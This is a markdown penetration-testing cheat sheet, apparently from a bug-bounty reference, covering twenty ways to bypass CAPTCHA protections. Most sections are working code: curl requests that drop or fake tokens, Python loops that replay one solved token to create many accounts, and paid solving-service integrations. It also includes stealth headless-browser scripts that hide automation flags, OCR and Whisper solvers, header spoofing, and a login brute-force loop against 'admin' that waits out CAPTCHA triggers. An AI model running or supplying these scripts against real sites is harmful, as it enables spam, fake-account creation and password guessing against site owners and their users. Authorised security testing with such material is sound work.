# 🤖 CAPTCHA Bypass

> A complete reference for identifying and bypassing CAPTCHA implementations during penetration testing and bug bounty engagements. Covers all CAPTCHA types — reCAPTCHA v2/v3, hCaptcha, image/text/audio challenges, and custom implementations.

---

## Table of Contents

- [Overview](#overview)
- [CAPTCHA Types & Attack Surface](#captcha-types--attack-surface)
- [Method 1 — Missing Server-Side Validation](#method-1--missing-server-side-validation)
- [Method 2 — Remove CAPTCHA Parameter](#method-2--remove-captcha-parameter)
- [Method 3 — Reuse CAPTCHA Token](#method-3--reuse-captcha-token)
- [Method 4 — Response Manipulation](#method-4--response-manipulation)
- [Method 5 — Old / Expired Token Accepted](#method-5--old--expired-token-accepted)
- [Method 6 — Same Token for All Users](#method-6--same-token-for-all-users)
- [Method 7 — CAPTCHA Solved in Request but Not Verified](#method-7--captcha-solved-in-request-but-not-verified)
- [Method 8 — Audio CAPTCHA Bypass](#method-8--audio-captcha-bypass)
- [Method 9 — OCR / AI Image Solving](#method-9--ocr--ai-image-solving)
- [Method 10 — CAPTCHA Solving Services](#method-10--captcha-solving-services)
- [Method 11 — reCAPTCHA v2 Token Bypass](#method-11--recaptcha-v2-token-bypass)
- [Method 12 — reCAPTCHA v3 Score Manipulation](#method-12--recaptcha-v3-score-manipulation)
- [Method 13 — hCaptcha Bypass](#method-13--hcaptcha-bypass)
- [Method 14 — X-Forwarded-For IP Bypass](#method-14--x-forwarded-for-ip-bypass)
- [Method 15 — Subdomain / Older Endpoint Without CAPTCHA](#method-15--subdomain--older-endpoint-without-captcha)
- [Method 16 — Headless Browser Stealth](#method-16--headless-browser-stealth)
- [Method 17 — CAPTCHA Parameter in Wrong Location](#method-17--captcha-parameter-in-wrong-location)
- [Method 18 — Change Request Method](#method-18--change-request-method)
- [Method 19 — Math / Logic CAPTCHA Automation](#method-19--math--logic-captcha-automation)
- [Method 20 — Rate Limit Without CAPTCHA Enforcement](#method-20--rate-limit-without-captcha-enforcement)
- [Complete Testing Checklist](#complete-testing-checklist)
- [Tools](#tools)
- [References](#references)

---

## Overview

**CAPTCHA** (Completely Automated Public Turing test to tell Computers and Humans Apart) is designed to block automated bots. Weak or misconfigured CAPTCHA implementations are exploitable in multiple ways — from trivial parameter removal to full AI-based solving.

### How CAPTCHA Normally Works

```
[1] User loads page → CAPTCHA challenge rendered
        ↓
[2] User solves CAPTCHA → client receives a token
        ↓
[3] Token submitted with form data to server
        ↓
[4] Server calls CAPTCHA provider API to verify token
        ↓
[5] API returns {success: true/false} → server allows/blocks request
```

### Where Bypasses Occur

```
[1] Challenge rendered ────── Skip entirely (no server check)
[2] Token generated ────────  Reuse, replay, predict
[3] Token submitted ────────  Remove parameter, empty value
[4] Server verifies ─────────  No verification at all (client-trust)
[5] Allow/block ─────────────  Response manipulation
```

---

## CAPTCHA Types & Attack Surface

| CAPTCHA Type | Description | Primary Bypass |
|---|---|---|
| **Text CAPTCHA** | Distorted text to retype | OCR, AI solvers |
| **Image CAPTCHA** | Select matching images (traffic lights, etc.) | AI/ML solvers, solving services |
| **Audio CAPTCHA** | Spoken digits/words to type | Speech-to-text (Google STT, Whisper) |
| **Math CAPTCHA** | Solve `3 + 4 = ?` | Automated parsing and calculation |
| **reCAPTCHA v2** | Checkbox + optional image grid | Token reuse, solving services, headless stealth |
| **reCAPTCHA v3** | Invisible behavior scoring (0.0–1.0) | Score manipulation, human-like behavior |
| **hCaptcha** | Image challenges, privacy-focused | Token reuse, solving services |
| **Cloudflare Turnstile** | Invisible proof-of-work | Headless stealth, token injection |
| **Custom CAPTCHA** | App-specific challenge | Logic analysis, parameter removal |
| **Puzzle CAPTCHA** | Slide/drag puzzle | Selenium automation, solver APIs |

---

## Method 1 — Missing Server-Side Validation

> The most critical finding. The application sends a CAPTCHA challenge to the client but **never validates** the token on the server side. The CAPTCHA is purely decorative.

### Detection

```
1. Complete a legitimate request WITH solving the CAPTCHA
2. Capture the full request in Burp Suite
3. Resend the SAME request WITHOUT the CAPTCHA token
4. If the request succeeds → no server-side validation (CRITICAL)
```

### Test with cURL

```bash
# Normal request WITH captcha token
curl -X POST https://target.com/register \
  -d "username=test&password=pass&g-recaptcha-response=VALID_TOKEN"

# Bypass — WITHOUT captcha token
curl -X POST https://target.com/register \
  -d "username=test&password=pass"

# If both return 200 OK → CAPTCHA not validated server-side
```

---

## Method 2 — Remove CAPTCHA Parameter

> Even when the server performs some validation, removing the parameter entirely may bypass the check due to improper null/missing value handling.

### Parameters to Remove

```
# reCAPTCHA
g-recaptcha-response
g_recaptcha_response
recaptcha_response
recaptcha-response

# hCaptcha
h-captcha-response
h_captcha_response
hcaptcha-response

# Generic
captcha
captcha_token
captcha_code
captchaToken
captcha_answer
verify
verification_code
```

### Burp Suite Steps

```
1. Intercept POST /submit (with valid captcha)
2. In request body → delete the captcha parameter line entirely
3. Forward the request
4. If response is 200 success → bypass confirmed
```

### Test Empty Values

```
# Try various empty/null substitutions
captcha=
captcha=null
captcha=undefined
captcha=0
captcha=false
captcha=none
captcha=BYPASS
captcha=test
g-recaptcha-response=
g-recaptcha-response=null
```

---

## Method 3 — Reuse CAPTCHA Token

> CAPTCHA tokens are meant to be single-use. If the server does not invalidate a token after first use, it can be replayed indefinitely.

### Test Steps

```
1. Solve CAPTCHA legitimately → receive token
   e.g. g-recaptcha-response=03AGdBq25...VALID_TOKEN

2. Submit form successfully → action completes

3. Capture the SAME request in Burp Repeater

4. Resend the SAME request with the SAME token
   g-recaptcha-response=03AGdBq25...VALID_TOKEN (REUSED)

5. If request succeeds again → token not invalidated (BYPASS)
```

### Automation with Reused Token

```python
import requests

# Solve CAPTCHA once (manually or via service)
VALID_TOKEN = "03AGdBq25...your_real_token_here"

url = "https://target.com/submit"
session = requests.Session()

# Spam the endpoint with the same token
for i in range(100):
    r = session.post(url, data={
        "username": f"user{i}",
        "email": f"user{i}@test.com",
        "g-recaptcha-response": VALID_TOKEN
    })
    print(f"[{i}] Status: {r.status_code} → {r.text[:80]}")
```

---

## Method 4 — Response Manipulation

> The server makes an API call to the CAPTCHA provider, receives a response, but the application logic trusts the **client-visible response** rather than the raw API result.

### Intercept & Modify CAPTCHA Verification Response

```
# Server sends CAPTCHA token to Google reCAPTCHA API
# API returns:
{"success": false, "error-codes": ["invalid-input-response"]}

# Manipulate in Burp (intercept server response):
{"success": true}
```

### Steps in Burp

```
1. Proxy → Options → Match and Replace (Response)
   Match:    "success": false
   Replace:  "success": true

2. Submit form with wrong/empty CAPTCHA
3. Burp intercepts the verification response and replaces it
4. Application receives "success: true" → grants access
```

> **Note:** This works only if the CAPTCHA API response passes through a proxy or if the verification is done client-side.

---

## Method 5 — Old / Expired Token Accepted

> CAPTCHA tokens expire (reCAPTCHA v2 tokens expire in ~2 minutes). If the server doesn't enforce expiry, old tokens can be replayed.

### Test Steps

```
1. Solve CAPTCHA → get token
2. Wait 5–10 minutes (past expiry window)
3. Submit the OLD expired token
4. If accepted → expiry not enforced (BYPASS)
```

### reCAPTCHA Token Expiry

```
reCAPTCHA v2 token  → expires ~2 minutes after generation
reCAPTCHA v3 token  → expires ~2 minutes after generation
hCaptcha token      → expires within a few minutes
Custom token        → depends on implementation
```

---

## Method 6 — Same Token for All Users

> In custom CAPTCHA implementations, the same token might be valid for any user session (not bound to a specific session or user).

### Test Steps

```
1. Browser A: Solve CAPTCHA → get token T1
2. Browser B (different session/user): Submit form with token T1
3. If Browser B succeeds → token is not session-bound (BYPASS)
```

### Check Token Binding

```bash
# Get token from Session A
TOKEN="captcha_token_from_session_A"

# Submit from Session B with different cookies
curl -X POST https://target.com/submit \
  -H "Cookie: session=DIFFERENT_SESSION" \
  -d "data=test&captcha=$TOKEN"
```

---

## Method 7 — CAPTCHA Solved in Request but Not Verified

> Some applications verify CAPTCHA on the **first** request of a flow but not on subsequent requests in the same session.

### Multi-Step Form Bypass

```
Step 1: /register/step1 → CAPTCHA required → solve it
Step 2: /register/step2 → CAPTCHA NOT required
Step 3: /register/submit → CAPTCHA NOT required

# Go directly to step 3 without solving CAPTCHA at all
curl -b "session=COOKIE" -X POST https://target.com/register/submit \
  -d "username=spam&email=spam@test.com"
```

### API vs UI Endpoint

```
# UI: POST /register (enforces CAPTCHA)
# API: POST /api/register (no CAPTCHA check)

curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test","email":"test@test.com","password":"pass"}'
```

---

## Method 8 — Audio CAPTCHA Bypass

> Audio CAPTCHAs (accessibility alternative) are easier to solve programmatically using speech-to-text engines.

### Using Google Speech-to-Text

```python
import requests
import speech_recognition as sr
from pydub import AudioSegment
import io

def solve_audio_captcha(audio_url):
    # Download audio challenge
    audio_data = requests.get(audio_url).content

    # Convert mp3 to wav
    audio = AudioSegment.from_mp3(io.BytesIO(audio_data))
    wav_io = io.BytesIO()
    audio.export(wav_io, format="wav")
    wav_io.seek(0)

    # Speech recognition
    recognizer = sr.Recognizer()
    with sr.AudioFile(wav_io) as source:
        audio_content = recognizer.record(source)

    try:
        text = recognizer.recognize_google(audio_content)
        print(f"[+] Audio CAPTCHA solved: {text}")
        return text
    except sr.UnknownValueError:
        return None
```

### Using OpenAI Whisper

```python
import whisper
import requests
import tempfile

def solve_with_whisper(audio_url):
    model = whisper.load_model("base")

    # Download audio
    audio_data = requests.get(audio_url).content
    with tempfile.NamedTemporaryFile(suffix=".mp3", delete=False) as f:
        f.write(audio_data)
        tmp_path = f.name

    result = model.transcribe(tmp_path)
    print(f"[+] Whisper result: {result['text']}")
    return result['text'].strip()
```

### reCAPTCHA Audio Bypass Steps

```
1. On reCAPTCHA challenge → click the audio icon (headphones)
2. Get audio file URL from network traffic (Burp/DevTools)
3. Download and process with speech-to-text
4. Submit transcribed text as CAPTCHA answer
```

---

## Method 9 — OCR / AI Image Solving

> Traditional text CAPTCHAs and simple image challenges can be solved with OCR or AI image recognition.

### Tesseract OCR (Text CAPTCHA)

```python
import pytesseract
from PIL import Image
import requests
from io import BytesIO
import cv2
import numpy as np

def solve_text_captcha(image_url):
    # Download CAPTCHA image
    response = requests.get(image_url)
    img = Image.open(BytesIO(response.content))

    # Preprocessing — improve OCR accuracy
    img_array = np.array(img)
    gray = cv2.cvtColor(img_array, cv2.COLOR_BGR2GRAY)
    thresh = cv2.threshold(gray, 127, 255, cv2.THRESH_BINARY)[1]
    processed = Image.fromarray(thresh)

    # OCR
    config = '--psm 8 --oem 3 -c tessedit_char_whitelist=0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    text = pytesseract.image_to_string(processed, config=config)
    return text.strip()

result = solve_text_captcha("https://target.com/captcha.png")
print(f"[+] CAPTCHA answer: {result}")
```

### ddddocr (Modern CAPTCHA OCR Library)

```python
import ddddocr
import requests

ocr = ddddocr.DdddOcr()

response = requests.get("https://target.com/captcha.png")
result = ocr.classification(response.content)
print(f"[+] Solved: {result}")
```

---

## Method 10 — CAPTCHA Solving Services

> Third-party services use human workers or AI to solve CAPTCHAs programmatically. Useful when other bypass methods fail.

### 2Captcha

```python
import requests
import time

API_KEY = "YOUR_2CAPTCHA_API_KEY"

def solve_recaptcha_v2(site_key, page_url):
    # Submit CAPTCHA task
    submit = requests.post("http://2captcha.com/in.php", data={
        "key": API_KEY,
        "method": "userrecaptcha",
        "googlekey": site_key,
        "pageurl": page_url,
        "json": 1
    }).json()

    if submit["status"] != 1:
        raise Exception(f"Submit failed: {submit}")

    task_id = submit["request"]
    print(f"[*] Task submitted: {task_id}")

    # Poll for result
    for _ in range(30):
        time.sleep(5)
        result = requests.get("http://2captcha.com/res.php", params={
            "key": API_KEY,
            "action": "get",
            "id": task_id,
            "json": 1
        }).json()

        if result["status"] == 1:
            print(f"[+] Token: {result['request'][:50]}...")
            return result["request"]
        elif result["request"] != "CAPCHA_NOT_READY":
            raise Exception(f"Error: {result}")

    raise Exception("Timeout waiting for CAPTCHA solution")

# Usage
token = solve_recaptcha_v2(
    site_key="6Le-wvkSAAAAAPBMRTvw0Q4Muexq9bi0DJwx_mJ-",
    page_url="https://target.com/register"
)
print(f"[+] Use this token: {token}")
```

### CapSolver

```python
import capsolver

capsolver.api_key = "YOUR_CAPSOLVER_KEY"

solution = capsolver.solve({
    "type": "ReCaptchaV2Task",
    "websiteURL": "https://target.com",
    "websiteKey": "SITE_KEY_HERE"
})

token = solution["gRecaptchaResponse"]
print(f"[+] Token: {token}")
```

### Anti-Captcha

```python
from anticaptchaofficial.recaptchav2proxyless import recaptchaV2Proxyless

solver = recaptchaV2Proxyless()
solver.set_verbose(1)
solver.set_key("YOUR_ANTICAPTCHA_KEY")
solver.set_website_url("https://target.com")
solver.set_website_key("SITE_KEY")

token = solver.solve_and_return_solution()
print(f"[+] Token: {token}")
```

### Solving Service Comparison

| Service | reCAPTCHA v2 | reCAPTCHA v3 | hCaptcha | Price |
|---|---|---|---|---|
| 2Captcha | ✅ | ✅ | ✅ | ~$2.99/1000 |
| CapSolver | ✅ | ✅ | ✅ | ~$1.80/1000 |
| Anti-Captcha | ✅ | ✅ | ✅ | ~$2.00/1000 |
| DeathByCaptcha | ✅ | ✅ | ✅ | ~$2.99/1000 |

---

## Method 11 — reCAPTCHA v2 Token Bypass

> reCAPTCHA v2 tokens can sometimes be extracted and reused, or bypassed by injecting a token into the DOM.

### Token Injection via JavaScript

```javascript
// In browser console — inject a pre-solved token directly into the hidden field
document.getElementById("g-recaptcha-response").innerHTML = "YOUR_VALID_TOKEN";

// For invisible reCAPTCHA — call the callback directly
___grecaptcha_cfg.clients[0].aa.l.callback("YOUR_VALID_TOKEN");
```

### Identify Site Key

```bash
# Find the reCAPTCHA site key in page source
curl -s https://target.com/register | grep -o 'data-sitekey="[^"]*"'
curl -s https://target.com/register | grep -o 'sitekey: "[^"]*"'
```

### Using selenium-recaptcha-solver

```python
from selenium import webdriver
from selenium_recaptcha_solver import RecaptchaSolver

driver = webdriver.Chrome()
solver = RecaptchaSolver(driver)

driver.get("https://target.com/register")
solver.click_recaptcha_v2(iframe=driver.find_element("css selector", "iframe[title*='reCAPTCHA']"))
```

---

## Method 12 — reCAPTCHA v3 Score Manipulation

> reCAPTCHA v3 assigns a risk score (0.0 = bot, 1.0 = human). No challenge is shown — the application decides based on the score threshold.

### Raise Score to Look Human

```python
# Techniques to raise reCAPTCHA v3 score:

# 1. Use real browser (not headless)
# 2. Move mouse naturally before submitting
# 3. Scroll the page
# 4. Interact with page elements (clicks, hovers)
# 5. Use residential proxy (not datacenter IP)
# 6. Have cookies and browser history
# 7. Avoid suspicious headers (no automation markers)
```

### Selenium with Human Simulation

```python
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
import time, random

options = webdriver.ChromeOptions()
# Remove automation flags
options.add_argument("--disable-blink-features=AutomationControlled")
options.add_experimental_option("excludeSwitches", ["enable-automation"])
options.add_experimental_option("useAutomationExtension", False)

driver = webdriver.Chrome(options=options)

# Override webdriver property
driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

driver.get("https://target.com")
time.sleep(random.uniform(2, 4))

# Simulate human mouse movement
actions = ActionChains(driver)
actions.move_by_offset(random.randint(100, 300), random.randint(100, 300))
actions.perform()
time.sleep(random.uniform(1, 3))

# Scroll
driver.execute_script("window.scrollBy(0, 300)")
time.sleep(random.uniform(1, 2))
```

### Check Score Threshold

```
# If application accepts score >= 0.3 (instead of >= 0.5 or >= 0.7)
# Lower threshold = easier to bypass

# Find score threshold in JS:
# Search page source for:
#   score
#   threshold
#   action: "submit"
```

---

## Method 13 — hCaptcha Bypass

> hCaptcha is similar to reCAPTCHA v2 but used as an alternative. Many of the same techniques apply.

### Token Reuse

```python
# hCaptcha tokens start with "P1_"
# Test reusing the same token across multiple requests
HCAPTCHA_TOKEN = "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."

import requests
for i in range(10):
    r = requests.post("https://target.com/submit", data={
        "email": f"test{i}@test.com",
        "h-captcha-response": HCAPTCHA_TOKEN
    })
    print(f"[{i}] {r.status_code}")
```

### hCaptcha Site Key Extraction

```bash
# Find in page source
curl -s https://target.com | grep -o 'data-sitekey="[^"]*"'
```

### Solve via 2Captcha

```python
import requests, time

def solve_hcaptcha(site_key, page_url):
    submit = requests.post("http://2captcha.com/in.php", data={
        "key": "YOUR_2CAPTCHA_KEY",
        "method": "hcaptcha",
        "sitekey": site_key,
        "pageurl": page_url,
        "json": 1
    }).json()

    task_id = submit["request"]
    for _ in range(30):
        time.sleep(5)
        result = requests.get("http://2captcha.com/res.php", params={
            "key": "YOUR_2CAPTCHA_KEY",
            "action": "get",
            "id": task_id,
            "json": 1
        }).json()
        if result["status"] == 1:
            return result["request"]
    return None
```

---

## Method 14 — X-Forwarded-For IP Bypass

> Some applications skip CAPTCHA for requests from trusted/internal IP ranges. Spoofing these headers can bypass CAPTCHA enforcement.

### Headers to Try

```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 10.0.0.1
X-Forwarded-For: 192.168.1.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
CF-Connecting-IP: 127.0.0.1
```

### Burp Match and Replace

```
Proxy → Options → Match and Replace:
Type: Request Header
Match: ^X-Forwarded-For.*
Replace: X-Forwarded-For: 127.0.0.1
```

### cURL Test

```bash
curl -X POST https://target.com/register \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -d "username=test&email=test@test.com"
```

---

## Method 15 — Subdomain / Older Endpoint Without CAPTCHA

> Dev, staging, or mobile API endpoints may lack CAPTCHA enforcement.

### Enumerate Endpoints

```bash
# Find subdomains without CAPTCHA
subfinder -d target.com -silent | while read sub; do
  status=$(curl -s -o /dev/null -w "%{http_code}" https://$sub/register)
  echo "$sub → $status"
done

# Common targets
dev.target.com/register
staging.target.com/register
api.target.com/v1/register
mobile-api.target.com/register
m.target.com/register
```

### API Endpoint vs Web Endpoint

```bash
# Web endpoint (CAPTCHA enforced)
POST /register
POST /login
POST /contact

# API endpoint (CAPTCHA not enforced)
POST /api/register
POST /api/v1/register
POST /api/v2/users/create
POST /rest/auth/login
```

---

## Method 16 — Headless Browser Stealth

> Standard headless browsers (Puppeteer, Playwright, Selenium) are detected by reCAPTCHA/hCaptcha via browser fingerprinting. Stealth mode hides these markers.

### Puppeteer Stealth

```javascript
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

(async () => {
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();

    // Set realistic viewport and user agent
    await page.setViewport({ width: 1366, height: 768 });
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');

    await page.goto('https://target.com/register');

    // Simulate human behavior
    await page.mouse.move(500, 300);
    await page.waitForTimeout(1000 + Math.random() * 2000);
    await page.evaluate(() => window.scrollBy(0, 200));
    await page.waitForTimeout(500 + Math.random() * 1000);

    // Fill and submit form
    await page.type('#username', 'testuser', { delay: 100 });
    await page.type('#password', 'password123', { delay: 80 });
    await page.click('#submit');

    await browser.close();
})();
```

### Playwright Stealth

```python
from playwright.sync_api import sync_playwright
import random, time

with sync_playwright() as p:
    browser = p.chromium.launch(headless=False)
    context = browser.new_context(
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        viewport={"width": 1366, "height": 768},
        locale="en-US"
    )
    page = context.new_page()

    # Remove webdriver flag
    page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

    page.goto("https://target.com/register")
    time.sleep(random.uniform(2, 4))

    page.mouse.move(400 + random.randint(0,100), 300 + random.randint(0,100))
    time.sleep(random.uniform(1, 2))

    page.fill("#email", "test@test.com")
    page.fill("#password", "password123")
    page.click("#submit")

    browser.close()
```

### Detection Markers to Hide

```javascript
// Common bot detection checks — ensure these return human-like values
navigator.webdriver          // Should be undefined
navigator.plugins.length     // Should be > 0
navigator.languages          // Should be ["en-US", "en"]
window.chrome                // Should exist in Chrome
navigator.permissions        // Should not throw
WebGLRenderingContext        // Should exist
```

---

## Method 17 — CAPTCHA Parameter in Wrong Location

> If the CAPTCHA token is moved from its expected location (body → header, GET → POST), the server validation may fail gracefully and allow the request.

### Move Parameter to Different Location

```
# Original: token in POST body
POST /submit
g-recaptcha-response=TOKEN&username=test

# Move to URL parameter
POST /submit?g-recaptcha-response=TOKEN
username=test

# Move to header
POST /submit
X-Recaptcha-Token: TOKEN
username=test

# Move to different body format
Content-Type: application/json
{"username": "test", "g-recaptcha-response": "TOKEN"}
```

---

## Method 18 — Change Request Method

> Validation logic may differ by HTTP method. Switching from POST to GET or PUT may bypass CAPTCHA checks.

```bash
# Original: POST /register (CAPTCHA enforced)
curl -X POST https://target.com/register -d "username=test&captcha=TOKEN"

# Try: GET /register (CAPTCHA not enforced?)
curl -X GET "https://target.com/register?username=test"

# Try: PUT /register
curl -X PUT https://target.com/register -d "username=test"

# Try: PATCH /register
curl -X PATCH https://target.com/register -d "username=test"
```

---

## Method 19 — Math / Logic CAPTCHA Automation

> Simple math or word-based CAPTCHAs can be solved automatically by parsing the challenge from the HTML.

### Parse and Solve Math CAPTCHA

```python
import requests
from bs4 import BeautifulSoup
import re

session = requests.Session()
page = session.get("https://target.com/register")
soup = BeautifulSoup(page.text, "html.parser")

# Find CAPTCHA challenge: "What is 7 + 3?"
captcha_text = soup.find("span", {"class": "captcha-question"}).text
print(f"[*] Challenge: {captcha_text}")

# Parse and evaluate
match = re.search(r'(\d+)\s*([+\-*])\s*(\d+)', captcha_text)
if match:
    a, op, b = int(match.group(1)), match.group(2), int(match.group(3))
    answer = eval(f"{a}{op}{b}")
    print(f"[+] Answer: {answer}")

    # Submit with answer
    r = session.post("https://target.com/register", data={
        "username": "testuser",
        "captcha_answer": str(answer)
    })
    print(f"[+] Response: {r.status_code}")
```

### Word-Based CAPTCHA

```python
# Common word CAPTCHAs: "Type the word shown: SECURE"
# Extract from img alt text, hidden field, or visible span
captcha_word = soup.find("img", {"class": "captcha-img"})["alt"]
# Submit captcha_word directly
```

---

## Method 20 — Rate Limit Without CAPTCHA Enforcement

> CAPTCHA may be implemented but rate limiting is missing or insufficient — allowing automated solving at scale.

### Test Rate Limiting on CAPTCHA Endpoint

```bash
# Spam the OTP/form endpoint — does CAPTCHA actually stop repeated submissions?
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://target.com/register \
    -d "username=test$i&email=test$i@test.com&g-recaptcha-response=FAKE"
done
```

### Captcha Bypass via Slow Rate

```python
import requests, time

# CAPTCHA might only appear after N attempts
# Below the threshold → no CAPTCHA triggered
for i in range(1000):
    r = requests.post("https://target.com/login",
        data={"username": "admin", "password": f"password{i}"})

    if "captcha" not in r.text.lower():
        print(f"[{i}] No CAPTCHA triggered → {r.status_code}")
    else:
        print(f"[{i}] CAPTCHA triggered — waiting...")
        time.sleep(30)  # Wait before resuming
```

---

## Complete Testing Checklist

### Server-Side Validation
- [ ] CAPTCHA removable — no validation at all?
- [ ] Removing CAPTCHA parameter allows request to succeed?
- [ ] Empty string / null value accepted?
- [ ] Arbitrary fake token accepted?
- [ ] CAPTCHA only validated on first step of multi-step flow?
- [ ] UI endpoint validates CAPTCHA but API endpoint does not?

### Token Issues
- [ ] CAPTCHA token reusable (not invalidated after first use)?
- [ ] Expired token accepted (no expiry enforced)?
- [ ] Token not bound to session (usable across sessions)?
- [ ] Token not bound to specific action (usable for any action)?
- [ ] Old CAPTCHA token from previous session accepted?

### Implementation Weaknesses
- [ ] Response manipulation flips success to true?
- [ ] reCAPTCHA v3 score threshold too low?
- [ ] Audio CAPTCHA solvable via STT (Whisper/Google STT)?
- [ ] Text CAPTCHA solvable via OCR (Tesseract/ddddocr)?
- [ ] Math CAPTCHA solvable by parsing HTML?
- [ ] Same CAPTCHA token valid for different users?

### Infrastructure Bypass
- [ ] IP header spoofing (X-Forwarded-For) skips CAPTCHA?
- [ ] Subdomain or staging env lacks CAPTCHA?
- [ ] Older API version lacks CAPTCHA?
- [ ] Different HTTP method bypasses CAPTCHA check?
- [ ] CAPTCHA parameter moved to different location bypasses check?
- [ ] No rate limiting — CAPTCHA solving service viable at scale?

### Headless/Browser
- [ ] Headless browser stealth evades bot detection?
- [ ] navigator.webdriver flag removable?
- [ ] reCAPTCHA v3 score raisable via human-like behavior simulation?

---

## Tools

| Tool | Purpose |
|---|---|
| **Burp Suite** | Intercept, response manipulation, parameter removal |
| **2Captcha** | Human-powered CAPTCHA solving API |
| **CapSolver** | AI-powered CAPTCHA solving API |
| **Anti-Captcha** | CAPTCHA solving service |
| **Tesseract OCR** | Open-source text CAPTCHA OCR |
| **ddddocr** | Modern ML-based CAPTCHA recognition |
| **Whisper / SpeechRecognition** | Audio CAPTCHA solver |
| **Puppeteer + stealth** | Stealth headless Chrome automation |
| **Playwright** | Cross-browser stealth automation |
| **selenium-recaptcha-solver** | Automated reCAPTCHA solving |
| **ffuf** | Fuzz CAPTCHA parameters |
| **Python requests** | Custom bypass scripts |

---

## References

- OWASP Testing Guide — Testing for CAPTCHA
- PayloadsAllTheThings — CAPTCHA Bypass
- PortSwigger Research — CAPTCHA Bypass Techniques
- Google reCAPTCHA Developer Docs
- hCaptcha Developer Docs
- Black Hat Asia 2016 — Breaking reCAPTCHA
